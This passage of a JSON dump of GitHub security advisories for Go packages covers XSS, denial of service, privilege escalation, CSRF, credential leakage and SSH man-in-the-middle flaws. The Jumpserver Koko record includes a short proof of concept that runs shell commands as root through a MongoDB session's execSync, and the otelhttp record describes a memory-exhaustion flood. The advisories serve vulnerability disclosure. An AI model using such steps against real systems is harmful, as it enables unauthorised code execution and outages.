"WEB", "url": "https://github.com/answerdev/answer/commit/c3001de52af91f09c96e701facbce0b9fa0c98ad"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/802ee76d-fe01-482b-a9a4-34699a7c9110"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-02-08T18:17:25Z", "nvd_published_at": "2023-02-08T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wr8h-w969-36m8", "modified": "2023-03-03T22:56:32Z", "published": "2023-02-21T18:30:17Z", "aliases": ["CVE-2015-10085"], "summary": "GoPistolet vulnerable to Improper Resource Shutdown or Release", "details": "A vulnerability was found in GoPistolet. It has been declared as problematic. This vulnerability affects unknown code of the component MTA. The manipulation leads to denial of service. Continious delivery with rolling releases is used by this product. Therefore, no version details of affected nor updated releases are available. The name of the patch is b91aa4674d460993765884e8463c70e6d886bc90. It is recommended to apply a patch to fix this issue. VDB-221506 is the identifier assigned to this vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gopistolet/gopistolet"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20210418093520-a5395f728f8d"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-10085"}, {"type": "WEB", "url": "https://github.com/gopistolet/gopistolet/pull/27"}, {"type": "WEB", "url": "https://github.com/gopistolet/gopistolet/commit/b91aa4674d460993765884e8463c70e6d886bc90"}, {"type": "PACKAGE", "url": "https://github.com/gopistolet/gopistolet"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.221506"}, {"type": "WEB", "url": "https://vuldb.com/?id.221506"}], "database_specific": {"cwe_ids": ["CWE-404"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-03T22:56:32Z", "nvd_published_at": "2023-02-21T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xhjq-w7xm-p8qj", "modified": "2023-10-02T11:56:10Z", "published": "2023-02-07T22:39:34Z", "aliases": ["CVE-2017-3204"], "summary": "golang.org/x/crypto/ssh Man-in-the-Middle attack", "details": "The Go SSH library (golang.org/x/crypto/ssh) by default does not verify host keys, facilitating man-in-the-middle attacks if ClientConfig.HostKeyCallback is not set. Default behavior changed in commit e4e2799 to require explicitly registering a hostkey verification mechanism.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/crypto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20170330155735-e4e2799dd7aa"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-3204"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/19767"}, {"type": "WEB", "url": "https://github.com/golang/crypto/commit/e4e2799dd7aab89f583e1d898300d96367750991"}, {"type": "WEB", "url": "https://bridge.grumpy-troll.org/2017/04/golang-ssh-security/"}, {"type": "WEB", "url": "https://go.dev/cl/340830"}, {"type": "WEB", "url": "https://go.dev/issue/19767"}, {"type": "WEB", "url": "https://go.googlesource.com/crypto/+/e4e2799dd7aab89f583e1d898300d96367750991"}, {"type": "WEB", "url": "https://godoc.org/golang.org/x/crypto/ssh"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0013"}, {"type": "WEB", "url": "https://web.archive.org/web/20170423080311/https://www.securityfocus.com/bid/97481"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-3204"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-07T22:39:34Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rmw8-7823-wp7f", "modified": "2023-02-15T21:59:44Z", "published": "2023-02-08T09:30:24Z", "aliases": ["CVE-2023-0742"], "summary": "Answer contains Cross-site Scripting vulnerability", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.4.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0742"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/c3001de52af91f09c96e701facbce0b9fa0c98ad"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/d73a2c03-7035-453b-9c04-c733ace65544"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-02-08T22:35:27Z", "nvd_published_at": "2023-02-08T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hr4f-6jh8-f2vq", "modified": "2023-10-25T17:00:16Z", "published": "2023-10-18T18:25:58Z", "aliases": ["CVE-2023-45810"], "summary": "OpenFGA DoS vulnerability", "details": "## Overview\nOpenFGA is vulnerable to a DoS attack. When a number of ListObjects calls are executed, in some scenarios, those calls are not releasing resources even after a response has been sent, and the service as a whole becomes unresponsive.\n\n## Fix\nUpgrade to v1.3.4. This upgrade is backwards compatible.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openfga/openfga"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/openfga/openfga/security/advisories/GHSA-hr4f-6jh8-f2vq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45810"}, {"type": "PACKAGE", "url": "https://github.com/openfga/openfga"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/releases/tag/v1.3.4"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-18T18:25:58Z", "nvd_published_at": "2023-10-17T23:15:12Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q24m-6h38-5xj8", "modified": "2023-10-24T22:48:40Z", "published": "2023-10-19T17:10:00Z", "aliases": ["CVE-2023-45825"], "summary": "ydb-go-sdk token in custom credentials object can leak through logs", "details": "### Impact\nSince [ydb-go-sdk/v3.48.6](https://github.com/ydb-platform/ydb-go-sdk/blob/v3.48.6/internal/balancer/balancer.go#L71) if you use a custom credentials object (implementation of interface [Credentials](https://github.com/ydb-platform/ydb-go-sdk/blob/master/credentials/credentials.go#L10)) it may leak into logs. This happens because this object could be serialized into an error message using `fmt.Errorf(\"something went wrong (credentials: %q)\", credentials)` during connection to the YDB server. Printf func use placeholder `%q` for string representation of argument with quotes. If an argument implements interface `fmt.Stringer`, it will used through `String()` func. In other cases used fallback - serialization with reflection.\n\nIf such logging occurred, a  malicious user with access to logs could read sensitive information (i.e. credentials) information and use it to get access to the database.\n\nWho is impacted: applications with custom credentials object with an explicit token field.\n\nA leak could have occurred if all of these conditions were met simultaneously:\n1) The credentials object does not implement the `fmt.Stringer` interface (does not have a `String()` method) - potentially these are custom credentials. Official credentials have a `String()` method.\n2) There was an error connecting to YDB during driver creation via `ydb.Open(...)`.\n3) Some logging system was configured (`ydb-go-sdk` does not log such errors by default).\n4) The connection error was logged into a system that a malicious user had access to.\n\n### Patches\n`ydb-go-sdk` contains this problem in versions from v3.48.6 to v3.53.2. The fix for this problem has been released in version v3.53.3 ([PR](https://github.com/ydb-platform/ydb-go-sdk/pull/859)).\n\n### Workarounds\nImplement the `fmt.Stringer` interface in your custom credentials type with explicit stringify of object state.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ydb-platform/ydb-go-sdk/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.48.6"}, {"fixed": "3.53.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ydb-platform/ydb-go-sdk/security/advisories/GHSA-q24m-6h38-5xj8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45825"}, {"type": "WEB", "url": "https://github.com/ydb-platform/ydb-go-sdk/pull/859"}, {"type": "WEB", "url": "https://github.com/ydb-platform/ydb-go-sdk/commit/a0d92057c4e1bbdc5e85ae8d649edb0232b8fd4c"}, {"type": "PACKAGE", "url": "https://github.com/ydb-platform/ydb-go-sdk"}, {"type": "WEB", "url": "https://github.com/ydb-platform/ydb-go-sdk/blob/master/credentials/credentials.go#L10"}, {"type": "WEB", "url": "https://github.com/ydb-platform/ydb-go-sdk/blob/v3.48.6/internal/balancer/balancer.go#L71"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-19T17:10:00Z", "nvd_published_at": "2023-10-19T19:15:16Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4r5x-x283-wm96", "modified": "2023-10-24T19:47:50Z", "published": "2023-10-24T19:47:50Z", "aliases": ["CVE-2023-43651"], "summary": "Jumpserver Koko vulnerable to remote code execution on the host system via MongoDB shell ", "details": "### Impact\n\nAn authenticated user can exploit a vulnerability in MongoDB sessions to execute arbitrary commands, leading to remote code execution. This vulnerability may further be leveraged to gain root privileges on the host system.\n\n### Details\nThrough the WEB CLI interface provided by koko, a user logs into the authorized mongoDB database and exploits the MongoDB session to execute arbitrary commands.\n\n```\nadmin> const { execSync } = require(\"child_process\")\nadmin> console.log(execSync(\"id; hostname;\").toString())\nuid=0(root) gid=0(root) groups=0(root)\njms_koko\nadmin> \n```\n\n### Patches\nSafe versions: \n- v2.28.20\n- v3.7.1 \n\n### Workarounds\nIt is recommended to upgrade the safe versions.\n\nAfter upgrade, you can use the same method to check whether the vulnerability is fixed.\n```\nadmin> console.log(execSync(\"id; hostname;\").toString())\n/bin/sh: line 1: /bin/hostname: Permission denied\n```\n\n### References\nThanks for **Oskar Zeino-Mahmalat** of [Sonar](https://sonarsource.com/) found and report this vulnerability ", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/jumpserver/koko"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.28.20"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/jumpserver/koko"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.7.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/jumpserver/jumpserver/security/advisories/GHSA-4r5x-x283-wm96"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43651"}, {"type": "WEB", "url": "https://github.com/jumpserver/koko/commit/7d80db95d17c8f42bdf50260dfc21dc2bd0452c2"}, {"type": "WEB", "url": "https://github.com/jumpserver/koko/commit/857f8b9e41f0930dc6190a35d8601fffa5e884e7"}, {"type": "PACKAGE", "url": "https://github.com/jumpserver/koko"}], "database_specific": {"cwe_ids": ["CWE-94"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-24T19:47:50Z", "nvd_published_at": "2023-09-27T21:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rcjv-mgp8-qvmr", "modified": "2023-10-20T16:17:49Z", "published": "2023-10-16T14:01:54Z", "aliases": ["CVE-2023-45142"], "summary": "OpenTelemetry-Go Contrib vulnerable to denial of service in otelhttp due to unbound cardinality metrics", "details": "### Summary\n\nThis handler wrapper https://github.com/open-telemetry/opentelemetry-go-contrib/blob/5f7e6ad5a49b45df45f61a1deb29d7f1158032df/instrumentation/net/http/otelhttp/handler.go#L63-L65\nout of the box adds labels\n\n- `http.user_agent`\n- `http.method`\n\nthat have unbound cardinality. It leads to the server's potential memory exhaustion when many malicious requests are sent to it.\n\n### Details\n\nHTTP header User-Agent or HTTP method for requests can be easily set by an attacker to be random and long. The library internally uses [httpconv.ServerRequest](https://github.com/open-telemetry/opentelemetry-go/blob/v1.12.0/semconv/internal/v2/http.go#L159) that records every value for HTTP [method](https://github.com/open-telemetry/opentelemetry-go/blob/38e1b499c3da3107694ad2660b3888eee9c8b896/semconv/internal/v2/http.go#L204) and [User-Agent](https://github.com/open-telemetry/opentelemetry-go/blob/38e1b499c3da3107694ad2660b3888eee9c8b896/semconv/internal/v2/http.go#L223).\n\n### PoC\n\nSend many requests with long randomly generated HTTP methods or/and User agents (e.g. a million) and observe how memory consumption increases during it.\n\n### Impact\n\nIn order to be affected, the program has to configure a metrics pipeline, use [otelhttp.NewHandler](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/5f7e6ad5a49b45df45f61a1deb29d7f1158032df/instrumentation/net/http/otelhttp/handler.go#L63-L65) wrapper, and does not filter any unknown HTTP methods or User agents on the level of CDN, LB, previous middleware, etc.\n\n### Others\n\nIt is similar to already reported vulnerabilities\n- https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-5r5m-65gx-7vrh ([open-telemetry/opentelemetry-go-contrib](https://github.com/open-telemetry/opentelemetry-go-contrib))\n- https://github.com/advisories/GHSA-cg3q-j54f-5p7p ([prometheus/client_golang](https://github.com/prometheus/client_golang))\n\n### Workaround for affected versions\n\nAs a workaround to stop being affected [otelhttp.WithFilter()](https://pkg.go.dev/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp/filters) can be used, but it requires manual careful configuration to not log certain requests entirely.\n\nFor convenience and safe usage of this library, it should by default mark with the label `unknown` non-standard HTTP methods and User agents to show that such requests were made but do not increase cardinality. In case someone wants to stay with the current behavior, library API should allow to enable it.\n\nThe other possibility is to disable HTTP metrics instrumentation by passing [`otelhttp.WithMeterProvider`](https://pkg.go.dev/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp#WithMeterProvider) option with [`noop.NewMeterProvider`](https://pkg.go.dev/go.opentelemetry.io/otel/metric/noop#NewMeterProvider).\n\n### Solution provided by upgrading\n\nIn PR https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4277, released with package version 0.44.0, the values collected for attribute `http.request.method` were changed to be restricted to a set of well-known values and other high cardinality attributes were removed.\n\n### References\n\n- https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4277\n- https://github.com/open-telemetry/opentelemetry-go-contrib/releases/tag/v1.19.0\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.44.0"}]}]}, {"package": {"ecosystem": "Go", "name": "go.opentelemetry.io/contrib/instrumentation/github.com/emicklei/go-restful/otelrestful"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.44.0"}]}]}, {"package": {"ecosystem": "Go", "name": "go.opentelemetry.io/contrib/instrumentation/github.com/gin-gonic/gin/otelgin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.44.0"}]}]}, {"package": {"ecosystem": "Go", "name": "go.opentelemetry.io/contrib/instrumentation/github.com/gorilla/mux/otelmux"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.44.0"}]}]}, {"package": {"ecosystem": "Go", "name": "go.opentelemetry.io/contrib/instrumentation/github.com/labstack/echo/otelecho"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.44.0"}]}]}, {"package": {"ecosystem": "Go", "name": "go.opentelemetry.io/contrib/instrumentation/gopkg.in/macaron.v1/otelmacaron"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.44.0"}]}]}, {"package": {"ecosystem": "Go", "name": "go.opentelemetry.io/contrib/instrumentation/net/http/httptrace/otelhttptrace"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.44.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-5r5m-65gx-7vrh"}, {"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-rcjv-mgp8-qvmr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45142"}, {"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4277"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-cg3q-j54f-5p7p"}, {"type": "PACKAGE", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib"}, {"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib/blob/5f7e6ad5a49b45df45f61a1deb29d7f1158032df/instrumentation/net/http/otelhttp/handler.go#L63-L65"}, {"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib/releases/tag/v1.19.0"}, {"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go/blob/38e1b499c3da3107694ad2660b3888eee9c8b896/semconv/internal/v2/http.go#L223"}, {"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go/blob/v1.12.0/semconv/internal/v2/http.go#L159"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-16T14:01:54Z", "nvd_published_at": "2023-10-12T17:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pffg-92cg-xf5c", "modified": "2023-11-08T18:36:33Z", "published": "2023-10-05T20:57:20Z", "aliases": [], "summary": "gnark-crypto's exponentiation in the pairing target group GT using GLV can give incorrect results", "details": "### Impact\nWhen the exponent is bigger than `r`, the group order of the pairing target group `GT`, the exponentiation \u00e0 la GLV (`ExpGLV`) can *sometimes* give incorrect results compared to normal exponentiation (`Exp`). \n\nThe issue impacts all users using `ExpGLV` for exponentiations in `GT`. This does not impact `Exp` and `ExpCyclotomic` which are sound. Also note that GLV methods in G1 and G2 are sound and _not_ impacted.\n\n### Patches\nFix has been implemented in pull request https://github.com/Consensys/gnark-crypto/pull/451 and merged in commit https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d to master branch.\n\nThe fix increased the bounds of the sub-scalars by 1. In fact, since https://github.com/Consensys/gnark-crypto/pull/213, we use a fast scalar decomposition that tradeoffs divisions (needed in the Babai rounding) by right-shifts. We precompute `b=2^m*v/d (m > log2(d))` and then at runtime compute `scalar*b/2^m` (`v` is a lattice vector and `d` the lattice determinant). This increases the bounds on sub-scalars by 1 which we check at runtime before increasing the loop size (we don't target constant-timeness). `m` is chosen to be a machine word twice big than `log2(d)` so that we rarely need to increase the loop size. Hence why the issue happens only *sometimes* if we omit to increase the bounds. This bounds increase was implemented in G1 and G2 but forgot in GT.\n\n### Workarounds\nUpdating to `v0.12.1+`. Alternatively, use `Exp` or `ExpCyclotomic` instead. We are not aware of any users using `ExpGLV` anyway.\n\n### References\n- Fix PR: https://github.com/Consensys/gnark-crypto/pull/451 \n- Fast scalar decomposition PR: https://github.com/Consensys/gnark-crypto/pull/213\n- https://eprint.iacr.org/2015/565 Sec.4.2\n\n### Acknowledgement\nThe vulnerability was reported by [Antonio Sanso](https://github.com/asanso) @ [EF](https://crypto.ethereum.org/).\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/consensys/gnark-crypto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.12.0"}}], "references": [{"type": "WEB", "url": "https://github.com/Consensys/gnark-crypto/security/advisories/GHSA-pffg-92cg-xf5c"}, {"type": "WEB", "url": "https://github.com/Consensys/gnark-crypto/pull/213"}, {"type": "WEB", "url": "https://github.com/Consensys/gnark-crypto/pull/451"}, {"type": "WEB", "url": "https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d"}, {"type": "WEB", "url": "https://eprint.iacr.org/2015/565"}, {"type": "PACKAGE", "url": "https://github.com/Consensys/gnark-crypto"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-10-05T20:57:20Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-8gwj-m6vh-2g6j", "modified": "2023-10-18T18:29:01Z", "published": "2023-10-12T00:30:29Z", "aliases": ["CVE-2023-1943"], "summary": "kOps privilege escalation vulnerability", "details": "Privilege Escalation in kOps using GCE/GCP Provider in Gossip Mode.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kops"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.25.4"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kops"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.26.0"}, {"fixed": "1.26.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1943"}, {"type": "WEB", "url": "https://github.com/kubernetes/kops/issues/15539"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kops"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/yrCE1x89oaU"}], "database_specific": {"cwe_ids": ["CWE-250"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-18T18:29:01Z", "nvd_published_at": "2023-10-12T00:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-35c7-w35f-xwgh", "modified": "2023-10-31T22:23:04Z", "published": "2023-10-30T03:30:15Z", "aliases": ["CVE-2021-25736"], "summary": "Kube-proxy may unintentionally forward traffic", "details": "Kube-proxy on Windows can unintentionally forward traffic to local processes listening on the same port (`spec.ports[*].port`) as a LoadBalancer Service when the LoadBalancer controller does not set the `status.loadBalancer.ingress[].ip` field. Clusters \nwhere the LoadBalancer controller sets the `status.loadBalancer.ingress[].ip` field are unaffected.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.21"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-25736"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/99958"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/b014610de3e5cf1bb0f7844b5758d29fc18b75e6"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/lIoOPObO51Q/m/O15LOazPAgAJ"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-31T22:23:04Z", "nvd_published_at": "2023-10-30T03:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7fxm-f474-hf8w", "modified": "2023-11-01T14:36:22Z", "published": "2023-10-31T21:32:35Z", "aliases": ["CVE-2023-3676"], "summary": "Kubernetes privilege escalation vulnerability", "details": "A security issue was discovered in Kubernetes where a user that can create pods on Windows nodes may be able to escalate to admin privileges on those nodes. Kubernetes clusters are only affected if they include Windows nodes.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.28.0"}, {"fixed": "1.28.1"}]}], "versions": ["1.28.0"]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.27.0"}, {"fixed": "1.27.5"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.26.0"}, {"fixed": "1.26.8"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.25.0"}, {"fixed": "1.25.13"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.24.17"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-3676"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/119339"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/120127"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/120129"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/120130"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/120131"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/120132"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/120133"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/073f9ea33a93ddaecdc2e829150fb715f6387399"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/39cc101c7855341c651a943b9836b50fbace8a6b"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/74b617310c24ca84c2ec90c3858af745d65b5226"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/890483394221c8f22e88c48f86cd4eaf4de65fd6"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/a53faf5e17ed0b0771a605c6401ba4cbf297b59a"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/d_fvHZ9a5zc"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20231130-0007/"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-01T14:36:22Z", "nvd_published_at": "2023-10-31T21:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-94w9-97p3-p368", "modified": "2023-10-23T21:09:50Z", "published": "2023-10-17T12:40:37Z", "aliases": ["CVE-2023-45128"], "summary": "CSRF Token Reuse Vulnerability", "details": "A Cross-Site Request Forgery (CSRF) vulnerability has been identified in the application, which allows an attacker to inject arbitrary values and forge malicious requests on behalf of a user. This vulnerability can allow an attacker to inject arbitrary values without any authentication, or perform various malicious actions on behalf of an authenticated user, potentially compromising the security and integrity of the application.\n\n## Vulnerability Details\n\nThe vulnerability is caused by improper validation and enforcement of CSRF tokens within the application. The following issues were identified:\n\n1. **Token Injection**: For 'safe' methods, the token was extracted from the cookie and saved to storage without further validation or sanitization.\n\n2. **Lack of Token Association**: The CSRF token was validated against tokens in storage but not associated with a session, nor by using a Double Submit Cookie Method, allowing for token reuse.\n\n### Specific Go Packages Affected\ngithub.com/gofiber/fiber/v2/middleware/csrf\n\n## Remediation\n\nTo remediate this vulnerability, it is recommended to take the following actions:\n\n1. **Update the Application**: Upgrade the application to a fixed version with a patch for the vulnerability.\n\n2. **Implement Proper CSRF Protection**: Review the updated documentation and ensure your application's CSRF protection mechanisms follow best practices.\n\n4. **Choose CSRF Protection Method**: Select the appropriate CSRF protection method based on your application's requirements, either the Double Submit Cookie method or the Synchronizer Token Pattern using sessions.\n\n5. **Security Testing**: Conduct a thorough security assessment, including penetration testing, to identify and address any other security vulnerabilities.\n\n## Defence-in-depth\n\nUsers should take additional security measures like captchas or Two-Factor Authentication (2FA) and set Session cookies with SameSite=Lax or SameSite=Secure, and the Secure and HttpOnly attributes.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gofiber/fiber/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.50.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gofiber/fiber/security/advisories/GHSA-94w9-97p3-p368"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45128"}, {"type": "WEB", "url": "https://github.com/gofiber/fiber/commit/8c3916dbf4ad2ed427d02c6eb63ae8b2fa8f019a"}, {"type": "WEB", "url": "https://github.com/gofiber/fiber/commit/b50d91d58ecdff2a330bf07950244b6c4caf65b1"}, {"type": "PACKAGE", "url": "https://github.com/gofiber/fiber"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": 